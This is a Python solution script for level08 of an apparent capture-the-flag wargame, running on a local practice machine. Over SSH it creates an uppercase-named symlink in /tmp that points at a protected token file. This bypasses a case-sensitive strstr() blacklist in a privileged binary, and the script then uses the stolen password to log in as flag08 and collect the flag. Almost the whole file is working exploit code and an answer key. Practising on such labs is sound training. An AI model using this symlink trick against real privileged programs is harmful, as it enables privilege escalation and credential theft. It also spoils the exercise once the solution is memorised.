"""Level08 - Case-Sensitive Blacklist Bypass"""

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from common.utils import ssh_cmd, scp_cmd, read_flag, save_flag


def exploit(host, port, ssh_port, pwd):
	"""Execute case-sensitive blacklist bypass."""
	print(f"[*] Connecting to level08@{host}:{ssh_port}")
	code, out, err = ssh_cmd(host, ssh_port, "level08", pwd, "id")
	if code != 0:
		print("[!] SSH connection failed")
		return False, "", ""
	print(f"[+] SSH OK: {out.strip()}\n")

	print("[*] Creating symlink with uppercase name...")
	cmd = "rm -f /tmp/TOKEN; ln -sf /home/user/level08/token /tmp/TOKEN && /home/user/level08/level08 /tmp/TOKEN"
	code, out, err = ssh_cmd(host, ssh_port, "level08", pwd, cmd)

	flag08_pwd = out.strip()
	if not flag08_pwd or len(flag08_pwd) < 20:
		print(f"[!] Failed: {(out+err).strip()}")
		return False, "", ""

	print(f"[+] Password found\n[*] Connecting as flag08...")
	code, out, err = ssh_cmd(host, ssh_port, "flag08", flag08_pwd, "getflag")
	if code != 0:
		return False, "", ""

	for line in (out + err).strip().split("\n"):
		if "token" in line.lower():
			for part in line.split():
				if len(part) > 20 and part.isalnum():
					print(f"[+] Flag found: {part}")
					return True, part, flag08_pwd
	return False, "", ""


def main():
	print("Level08 Case-Sensitive Blacklist Bypass Exploit\n")
	pwd = read_flag(7)
	success, token, flag08_pwd = exploit("localhost", 4747, 4242, pwd)

	if success:
		save_flag(8, token)
		print(f"\n[SUMMARY]\n  Vulnerability: Case-sensitive strstr() check")
		print(f"  Attack: Symlink with uppercase bypasses lowercase check")
		print(f"  Result: Reading protected token\n[ANSWER]\n  Flag08 Password: {flag08_pwd}\n  Level08 Token: {token}")
	else:
		print("[!] Exploit failed")
		sys.exit(1)


if __name__ == "__main__":
	main()
